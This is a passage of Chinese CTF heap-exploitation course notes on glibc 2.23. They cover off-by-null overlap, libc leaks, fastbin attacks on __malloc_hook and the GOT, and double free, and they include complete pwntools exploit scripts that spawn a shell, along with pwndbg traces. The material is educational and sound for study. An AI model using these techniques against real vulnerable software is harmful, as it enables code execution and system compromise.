#add(0x120, flat(cyclic(n = 8, length = 0x120)))
add(0x120, flat('a' * 248, 0x71, libc.sym['__malloc_hook'] - 0x23))
```

运行脚本，再次查看fastbin链，目标地址0x7f4b3b7a3aed已经成功链到fastbins，只要连续两次分配就可以分配到该地址

```
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x194f3b0 —▸ 0x7f4b3b7a3aed (_IO_wide_data_0+301) ◂— 0x4b3b464e20000000
0x80: 0x0
pwndbg> heapinfo                         # 查看堆信息
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x194f3b0 (overlap chunk with 0x18613e0(freed))
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x194f540 (size : 0x209e0)
       last remainder: 0x194f3e0 (size : 0x140)
            unsortbin: 0x194f3e0 (size : 0x140)
```

**STEP9** 创建节点，使分配到伪造的地址上，然后将`__malloc_hook`覆写为我们想要跳转的地址。
想要控制malloc参数指向"/bin/sh"地址比较难，可以使用one-gadget。

首先查找合适的one-gadget地址

```
$ ldd pwn                  # 查看使用的libc.so链接库路径，这里为/lib/x86_64-linux-gnu/libc-2.23.so
$ docker cp libc2.23:/lib/x86_64-linux-gnu/libc-2.23.so . # 从docker里将目标版本libc.so拷贝到本地
$ one_gadget ./libc-2.23.so # 查找one_gadget
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

找到4个，从其中随便选一个，更新脚本如下：

```
libc.sym['one_gadget'] = 0x45216
...
libc.address = u64(p.recvuntil('\x7f')[-6:]+'\0\0') - 0x3c4b78
...
add(0x120, flat('a' * 248, 0x71, libc.sym['__malloc_hook'] - 0x23))
add(0x68, 'x' * 0x10)
add(0x68, flat('\0' * 0x13, libc.sym['one_gadget']))
```

运行脚本并断点调试，可以通过magic看下`__malloc_hook`是否被成功更改。

不过发现这里的one-gadget不符合他的条件，利用失败。

**STEP10**  这里还有个技巧，在`__malloc_hook`前面有个`__realloc_hook`，可以用来当一个跳板

> Trick：
>
>   - 通过`__realloc_hook`做跳板满足one_gadget的条件
>   - 或者通过报错时的malloc满足one_gadget的条件

可能会有疑问，如果这里`__realloc_hook`还不成功怎么办，这个可能性不大，可以看下相关代码：

```
pwndbg> p &__malloc_hook               # 查看__malloc_hook地址
$9 = (void *(**)(size_t, const void *)) 0x7f66eae14b10 <__malloc_hook>
pwndbg> telescope 0x7f66eae14b10-0x20
00:0000│   0x7f66eae14af0 (_IO_wide_data_0+304) —▸ 0x7f66eae13260 (_IO_wfile_jumps)
01:0008│   0x7f66eae14af8 ◂— 0x0
... ↓
04:0020│   0x7f66eae14b10 (__malloc_hook) —▸ 0x7f66eaa95216 (do_system+1014)
05:0028│   0x7f66eae14b18 ◂— 0x0
... ↓
pwndbg> p &__realloc_hook              # 查看__realloc_hook地址
$10 = (void *(**)(void *, size_t, const void *)) 0x7f66eae14b08 <__realloc_hook>
pwndbg> x/20i &__libc_realloc          # 查看__libc_realloc代码
0x7ff5aa7026c0 <__GI___libc_realloc>:        push   r15
0x7ff5aa7026c2 <__GI___libc_realloc+2>:      push   r14
0x7ff5aa7026c4 <__GI___libc_realloc+4>:      push   r13
0x7ff5aa7026c6 <__GI___libc_realloc+6>:      push   r12
0x7ff5aa7026c8 <__GI___libc_realloc+8>:      mov    r13,rsi
0x7ff5aa7026cb <__GI___libc_realloc+11>:     push   rbp
0x7ff5aa7026cc <__GI___libc_realloc+12>:     push   rbx
0x7ff5aa7026cd <__GI___libc_realloc+13>:     mov    rbx,rdi
0x7ff5aa7026d0 <__GI___libc_realloc+16>:     sub    rsp,0x38
0x7ff5aa7026d4 <__GI___libc_realloc+20>:     mov    rax,QWORD PTR [rip+0x33f8f5]
0x7ff5aa7026db <__GI___libc_realloc+27>:     mov    rax,QWORD PTR [rax]
0x7ff5aa7026de <__GI___libc_realloc+30>:     test   rax,rax               # 刚好获取的就是one_gadget地址
0x7ff5aa7026e1 <__GI___libc_realloc+33>:     jne    0x7ff5aa7028e8 <__GI___libc_realloc+552>
...
↓
0x7ff5aa7028e8 <__GI___libc_realloc+552>:    mov    rdx,QWORD PTR [rsp+0x68]
0x7ff5aa7028ed <__GI___libc_realloc+557>:    call   rax
```

查看`__libc_realloc`汇编代码你会发现，这里的rax是我们的one_gadget，前面这里有多条push语句以及sub esp指令，能够调整堆栈，加上onegadget地址一般也不只一条，我们只要稍微调整一下跳转的具体地址(即`__libc_realloc`~`__libc_realloc`+16的范围进行尝试)，这种情况下一般都能满足one gadget条件。

修改脚本，并附加调试，运行脚本，成功获得shell

```
...
add(0x120, flat('a' * 248, 0x71, libc.sym['__malloc_hook'] - 0x23))
add(0x68, 'x' * 0x10)
pause()
add(0x68, flat('\0' * 0xb, libc.sym['one_gadget'], libc.sym['__libc_realloc'] + 16))
p.sendlineafter('choice:', '2')
p.sendlineafter(':', str(256))
p.interactive()
```

最终完整EXP如下

```
#!/usr/bin/env python
from pwn import *
from time import sleep
context(arch='amd64', os='linux', endian='little', log_level = 'debug')

elf = ELF('pwn')
libc = elf.libc

def show():
	p.sendlineafter('choice:', '1')
	sleep(0.01)

def add(length, content):
	p.sendlineafter('choice:', '2')
	p.sendlineafter(':', str(length))
	p.sendafter(':', content)
	sleep(0.01)

def edit(idx, length, content):
	p.sendlineafter('choice:', '3')
	p.sendlineafter(':', str(idx))
	p.sendlineafter(':', str(length))
	p.sendafter(':', content)
	sleep(0.01)

def delete(idx):
	p.sendlineafter('choice:', '4')
	p.sendlineafter(':', str(idx))
	sleep(0.01)

libc.sym['one_gadget'] = 0x4526a
p = process(elf.path)

add(0xf8, '0' * 0xf8)
add(0x68, '1' * 0x68)
add(0xf8, '2' * 0xf8)
add(0x18, '3' * 0x10)
delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
delete(2)
add(0xf0, 'x' * 0x10)
show()
libc.address = u64(p.recvuntil('\x7f')[-6:]+'\0\0') - 0x3c4b78
print('libc @ {:#x}'.format(libc.address))
assert libc.address & 0xfff == 0
add(0x160, '4' * 0x160)

add(0xf8, 'a' * 0xf8)
add(0x68, 'b' * 0x68)
add(0xf8, 'c' * 0xf0)
add(0x18, 'd' * 0x10)
delete(4)
edit(5, 0x68, flat('1' * 0x60, 0x170))
delete(6)
delete(5)
add(0x120, flat('a' * 248, 0x71, libc.sym['__malloc_hook'] - 0x23))
add(0x68, 'x' * 0x10)
pause()
add(0x68, flat('\0' * 0xb, libc.sym['one_gadget'], libc.sym['__libc_realloc']+6))

p.sendlineafter('choice:', '2')
p.sendlineafter(':', str(256))
p.interactive()
```

> **课程答疑环节**
>
> - Q: 在合并chunk之前一定要free？ A: 不一定
> - Q: 上节课讲到fastbin在free时不会清理P位，也就是说P位无意义吗?为什么这里修改了P位有用。



#### 方法3: fastbin attack

> 调试环境： Ubuntu 16.04 x64 (libc-2.23)

同样通过heap overflow来构造fastbin attack，不同在于fastbin attack到bss上，使用bss上的指针直接构造任意地址读写

程序中位于bss段上的node结构体定义如下：

```
struct NODE
{
    _DWORD size;
    _DWORD nop;
    char *cont;
}
```

使用NODE->size很容易在bss上伪造fake size，该方法比较简单，和前面示例思路相似：

```
pwndbg> fastbins 
fastbins
0x20: 0x2254040 —▸ 0x6020d8 (itemlist+24) —▸ 0x2254070 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
pwndbg> x/4gx 0x6020d8
0x6020d8 <itemlist+24>: 0x0000000000000000      0x0000000000000020
0x6020e8 <itemlist+40>: 0x0000000002254070      0x0000000000000010
pwndbg> telescope &itemlist
00:0000│   0x6020c0 (itemlist) ◂— 0x10
01:0008│   0x6020c8 (itemlist+8) —▸ 0x2254030 ◂— '000000000000000000000000!'
02:0010│   0x6020d0 (itemlist+16) ◂— 0x0
... ↓
04:0020│   0x6020e0 (itemlist+32) ◂— 0x20 /* ' ' */
05:0028│   0x6020e8 (itemlist+40) —▸ 0x2254070 ◂— '2222222222222222'
06:0030│   0x6020f0 (itemlist+48) ◂— 0x10
07:0038│   0x6020f8 (itemlist+56) —▸ 0x22540a0 ◂— 0x68732f6e69622f /* '/bin/sh' */
pwndbg> 
```

更多细节不再详述，EXP如下

```
#!/usr/bin/env python
#-*- coding: utf-8 -*-
from pwn import *
from time import sleep
context(arch='amd64', os='linux', endian='little', log_level = 'debug')

elf = ELF('pwn')
libc = elf.libc

def show():
    p.sendlineafter('choice:', '1')
    sleep(0.01)

def add(length, content):
    p.sendlineafter('choice:', '2')
    p.sendlineafter(':', str(length))
    p.sendafter(':', content)
    sleep(0.01)

def edit(idx, length, content):
    p.sendlineafter('choice:', '3')
    p.sendlineafter(':', str(idx))
    p.sendlineafter(':', str(length))
    p.sendafter(':', content)
    sleep(0.01)

def delete(idx):
    p.sendlineafter('choice:', '4')
    p.sendlineafter(':', str(idx))
    sleep(0.01)

p = process(elf.path)
add(0x10, '0' * 0x10)
add(0x10, '1' * 0x10)
add(0x20, '2' * 0x10)
add(0x10, '/bin/sh\0')
delete(1)
edit(0, 0x30, flat('0' * 0x18, 0x21, 0x6020d8))
pause()
add(0x10, '3' * 0x10)
add(0x10, flat(elf.got['free']))
show()
p.recvuntil('2 : ')
libc.address = u64(p.recv(6) + '\0\0') - libc.sym['free']
print('libc = {}'.format(hex(libc.address)))
assert libc.address & 0xfff == 0
edit(2, 0x20, flat(libc.sym['system'])[:6])
delete(3)
p.interactive()
```



### 实战UAF - 强网杯slient

附件地址: http://github.com/bash-c/public_class_examples

> 事实上这里一共有两个题目slient1和slient2，slient2里用到edit，slient1里没用到edit这里就不关注了。

```
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int choice; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init_0();
  cat_banner();
  while ( 1 )
  {
    __isoc99_scanf("%d", &choice);
    getchar();
    switch ( choice )
    {
      case 2:
        delete();
        break;
      case 3:
        edit();
        break;
      case 1:
        add();
        break;
    }
  }
}

void edit()
{
  int idx; // [rsp+0h] [rbp-10h]
  int len; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  __isoc99_scanf("%d", &idx);
  getchar();
  if ( idx >= 0 && idx <= 9 )
  {
    len = strlen(note[idx]);
    read_n(note[idx], len + 1);
    read_n(byte_602120, 48LL);
  }
}

void add()
{
  size_t size; // [rsp+0h] [rbp-20h]
  unsigned __int64 idx; // [rsp+8h] [rbp-18h]
  char *p; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  __isoc99_scanf("%lu", &size);
  getchar();
  p = (char *)malloc(size);
  read_n(p, size);
  for ( idx = 0LL; idx <= 9 && note[idx]; ++idx )
    ;
  if ( idx == 10 )
    exit(0);
  note[idx] = p;
}

void delete()
{
  int idx; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  __isoc99_scanf("%d", &idx);
  getchar();
  if ( idx >= 0 && idx <= 9 )
    free(note[idx]);                            // double free
}

void cat_banner()
{
  system("cat banner.txt");
}
```

程序没有开PIE，本身没有任何输出，没办法leak glibc，但是本身调用了system，可以直接用，可以通过fastbin double free更改free@GOT为system，或者改malloc hook都可以

**详细调试实战**

> 调试环境： Ubuntu 16.04 x64 (libc-2.23)

基本的EXP框架和交互函数封装和前面相同，这里不再赘述，直接进入主要构造利用部分。

**STEP2** 编写脚本，先free0，再free1，再free0，再申请回来

```
add(0x50, '00000000')
add(0x50, '11111111')
add(0x10, '/bin/sh')
delete(0) # 0
delete(1) # 1 -> 0
delete(0) # 0 -> 1 -> 0
pause()
add(0x50, flat(0xdeadbeef)) # 1 -> 0 -> 0xdeadbeef
add(0x50, 'aaaaaaaa') # 0 -> 0xdeadbeef
add(0x50, 'bbbbbbbb') # 0xdeadbeef
```

执行到pause()时，附加调试一下：

```
pwndbg> fastbins # 查看fastbin链
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x1d4c000 —▸ 0x1d4c068 —▸ 0x1d4c000 ◂— 0x1d4c068
0x70: 0x0
0x80: 0x0
pwndbg> checksec # 没开PIE，且got可写
[*] '/pwn/slient/silent'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
pwndbg> got                     # 查看got，找到free地址为0x602018
GOT protection: Partial RELRO | GOT functions: 15
[0x601ff8] __gmon_start__ -> 0
[0x602080] stdout@GLIBC_2.2.5 -> 0x7fcf3ca4e620 (_IO_2_1_stdout_) ◂— 0xfbad2087
[0x602090] stdin@GLIBC_2.2.5 -> 0x7fcf3ca4d8e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
[0x6020a0] stderr@GLIBC_2.2.5 -> 0x7fcf3ca4e540 (_IO_2_1_stderr_) ◂— 0xfbad2087
[0x602018] free@GLIBC_2.2.5 -> 0x400706 (free@plt+6) ◂— push   0 /* 'h' */
[0x602020] strlen@GLIBC_2.2.5 -> 0x400716 (strlen@plt+6) ◂— push   1
...
pwndbg> x/30gx 0x602018-0x20 # 查找附近内存，找下合法size，记下地址
0x601ff8:       0x0000000000000000      0x0000000000601e28
0x602008:       0x00007fbdb7254168      0x00007fbdb7044e10
0x602018:       0x00007fbdb6ce74f0      0x0000000000400716
pwndbg> x/4gx 0x601ffa           # 找到了可用地址
0x601ffa:       0x1e28000000000000      [0x01680000000060]     # fake_size
0x60200a:       0x0e1000007f5ee727      0x070600007f5ee706
```

**STEP3** 修改脚本

```
add(0x50, '00000000')
add(0x50, '11111111')
add(0x10, '/bin/sh')
delete(0) # 0
delete(1) # 1 -> 0
delete(0) # 0 -> 1 -> 0
add(0x50, flat(0x601ffa)) # 1 -> 0 -> target
add(0x50, 'aaaaaaaa') # 0 -> target
add(0x50, 'bbbbbbbb') # target
pause()
add(0x50, flat(cyclic(n = 8, length = 0x30)))
```

```
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x601ffa ◂— 0x4e1000007fbdb725
0x70: 0x0
0x80: 0x0
```

**STEP4** 修改脚本

```
add(0x50, '00000000')
add(0x50, '11111111')
add(0x10, '/bin/sh')
delete(0) # 0
delete(1) # 1 -> 0
delete(0) # 0 -> 1 -> 0
add(0x50, flat(0x601ffa)) # 1 -> 0 -> target
add(0x50, 'aaaaaaaa') # 0 -> target
add(0x50, 'bbbbbbbb') # target
# pause()
add(0x50, flat('\0' * 0xe, elf.sym['system']))
delete(2)
```

```
pwndbg> got # free@GOT成功覆写为system@plt地址
GOT protection: Partial RELRO | GOT functions: 11
[0x602018] free@GLIBC_2.2.5 -> 0x400730 (system@plt) ◂— jmp    qword ptr [rip + 0x2018fa]
[0x602020] strlen@GLIBC_2.2.5 -> 0xa310a32
[0x602028] __stack_chk_fail@GLIBC_2.4 -> 0x400726 (__stack_chk_fail@plt+6) ◂— push
...
```

完整EXP参考:

```
#!/usr/bin/env python
from pwn import *
from time import sleep
context(arch='amd64', endian='little', log_level='debug')
elf = ELF('silent')
p = process(elf.path)
p.recvuntil('\n')

def add_note(length, content):
	p.sendline('1')
	p.sendline(str(length))
	p.send(content)
	sleep(0.01)

def del_note(idx):
	p.sendline('2')
	p.sendline(str(idx))
	sleep(0.01)

add_note(0x50, 'a' * 0x4f) 
add_note(0x50, 'b' * 0x4f)  
del_note(0)           
del_note(1)               
del_note(0)   
add_note(0x50, flat(elf.got['free']-0x1e, 'c'*0x47))
add_note(0x50, '/bin/sh\0'+'d'*0x47)
add_note(0x50, 'c' * 0x4f)
pause()
add_note(0x50, flat('\0'*14, elf.plt['system']))
del_note(1)
p.interactive()
```



## 补充

- Source code is everything.

- 推荐阅读

  CTF wiki heap相关

  Glibc相关源码

> 总结，以上所有这些利益技巧，其实都是在利用堆管理中的各种feature
> 例如最早的unlink，不会检查fd、bk合法性，因此出现了unlink攻击；再比如上面的house of oragne，题目里只有malloc，没有free。实际上是作者研究了glibc代码，发现当top chunk不够时，会调sbrk申请新的，这时候会释放原来的top chunk，利用了这个feature

## 总结

**栈溢出原语总结**

> ```
> add_node(0x30, '0')                                     # 0 = chunk0
> add_node(0x30, '1')                                     # 1 = chunk1
> del_node(1)                                             #                  fastbin: chunk1
> edit_node(0, '2'*0x38 + p64(0x41) + p64(0xdeadbeef))    # overflow chunk1  fastbin: chunk1->0xdeadbeef
> add_node(0x30, '3')                                     # 1 = chunk1       fastbin: 0xdeadbeef
> add_node(0x30, '4')                                     # 2 = 0xdeadbeef
> ```

**DOUBLE FREE原语总结**

> 根据案例总结如下Double Free原语：
>
> 注意以下的0xdeadbeef地址的选取都是有条件的，需要对应的合法的chunk size
>
> 另外模拟常见的node_list结构模式进行说明，add_node对应malloc，del_node对应free
>
> 触发利用方式1：(参考上面调试案例和silent实例)
>
> ```
> add_node(0x30, '0')               # 0 = chunk0
> add_node(0x30, '1')               # 1 = chunk1
> del_node(0)                       #            fastbin: chunk0
> del_node(1)                       #            fastbin: chunk1->chunk0
> del_node(0)                       #            fastbin: chunk0->chunk1->chunk0
> add_node(0x30, '2')               # 0 = chunk0 fastbin: chunk1->chunk0
> edit_node(0, p64(0xdeadbeef))    #            fastbin: chunk1->chunk0->0xdeadbeef
> add_node(0x30, '3')               # 1 = chunk1
> add_node(0x30, '4')               # 2 = chunk0
> add_node(0x30, '5')               # 3 = 0xdeadbeef
> ```
>
> 触发利用方式2：(参考上面实例freenote)
>
> ```
> add_node(0x30, '0')               # 0 = chunk0
> add_node(0x30, '1')               # 1 = chunk1
> add_node(0x30, '2')               # 2 = chunk2
> del_node(0)                       #            fastbin: chunk0
> del_node(1)                       #            fastbin: chunk1->chunk0
> add_node(0x30, '3')               # 0 = chunk1
> del_node(2)                       #            fastbin: chunk2->chunk0
> del_node(1)                       #            fastbin: chunk1->chunk2->chunk0
> list_node(0)                      # leak chunk1->fd = chunk2_addr
> edit_node(0, p64(0xdeadbeef))    #            fastbin: chunk1->0xdeadbeef
> add_node(0x30, '4')               # 1 = chunk1
> add_node(0x30, '5')               # 3 = 0xdeadbeef
> ```
>
> 触发利用方式3：(比方式2更精炼，实例参考freenote解法2)
>
> ```
> add_node(0x30, '0')               # 0 = chunk0
> add_node(0x30, '1')               # 1 = chunk1
> del_node(0)                       #            fastbin: chunk0
> del_node(1)                       #            fastbin: chunk1->chunk0
> add_node(0x30, '2')               # 0 = chunk1 fastbin: chunk0
> del_node(1)                       #            fastbin: chunk1->chunk0
> list_node(0)                      # leak chunk1->fd = chunk0_addr
> edit_node(0, p64(0xdeadbeef))     #            fastbin: chunk1->0xdeadbeef
> add_node(0x30, '3')               # 1 = chunk1
> add_node(0x30, '4')               # 2 = 0xdeadbeef
> ```

**unsorted bin leak libc**

> 可用于leak libc，然后可配合fastbin double free完成利用
>
> ```
> add_node(0x80, '0')               # 0 = chunk0
> add_node(0x10, '1')               # 1 = chunk1, 防止0和2释放时自动合并，大小不限
> add_node(0x80, '2')               # 2 = chunk2
> add_node(0x10, '3')               # 3 = chunk3, 防止2释放时自动合并，大小不限
> del_node(2)                       #             unsortbin: chunk2<->main_area<->
> del_node(0)                       #             unsortbin: chunk0<->chunk2<->main_area<->
> add_node(0x80, '4')               # 0 = chunk2  unsortbin: chunk0<->main_area<->
> del_node(2)                       #             unsortbin: chunk2<->chunk0<->main_area<->
> add_node(0x80, '5')               # 2 = chunk0  unsortbin: chunk2<->main_area<->
> list_node(0)                      # leak chunk2->fd = main_area
> ```

**Off-by-null & overlap**

> 使用off-by-null & overlap来leak libc
> 
> ```
>add_node(0xf8, '0')               # 0 = chunk0
> add_node(0x68, '1')               # 1 = chunk1
> add_node(0xf8, '2')               # 2 = chunk2
> add_node(0x10, '3')               # 3 = chunk3
> del_node(0)                       # 释放chunk0, 放入unsorted bin
> edit_node(1, 'x'*0x60+p64(0x170)) # 触发off-by-null清chunk2的P，并覆写chunk2的prev_size为chunk0和chunk1之和
> del_node(2)                       # 释放chunk2，触发chunk0到chunk2合并放入unsorted bin，并将chunk1 overlap
> add_node(0xf0, '4')               # 从合并的chunk中分割出一个chunk，使剩余的空闲chunk的fd\bk刚好落入chunk1中
> list_node(1)                      # 打印chunk1输出落入的fd\bk，即main_area地址，实现leak libc
> add_node(0x160, '5')              # 将剩余的空闲chunk分配回来，以免影响后续的攻击
> ```
> 
> 使用off-by-null & overlap来构造fastbin attack
>
> ```
>add_node(0xf8, 'a')               # 0 = chunk0
> add_node(0x68, 'b')               # 1 = chunk1
> add_node(0xf8, 'c')               # 2 = chunk2
> add_node(0x10, 'd')               # 3 = chunk3
> del_node(0)                       # 释放chunk0, 放入unsorted bin
> edit_node(1, 'x'*0x60+p64(0x170)) # 触发off-by-null清chunk2的P，并覆写chunk2的prev_size为chunk0和chunk1之和
> del_node(2)                       # 释放chunk2，触发chunk0到chunk2合并放入unsorted bin，并将chunk1 overlap
> del_node(1)                       # 释放chunk1，使其进入fastbin
> add_node(0x120, flat('e' * 248, 0x71, 0xdeadbeef))  # 从合并的chunk中分割出一个chunk，并覆写chunk1的fd
> add_node(0x68, 'f')               # 经两次分配可以分配到目标地址
> add_node(0x68, 'g')               # 0xdeadbeef
> ```

## 参考

- 【长亭科技PWN系列公开课程 #4 PWN术进阶，玩转堆溢出 2020.04.30 长亭科技安全研究员 f1yy (yanyuzhang)】
- 【长亭科技PWN系列公开课程 #5 庖丁解堆，实战堆利用技术 2020.05.08 长亭科技安全研究员王奥博】

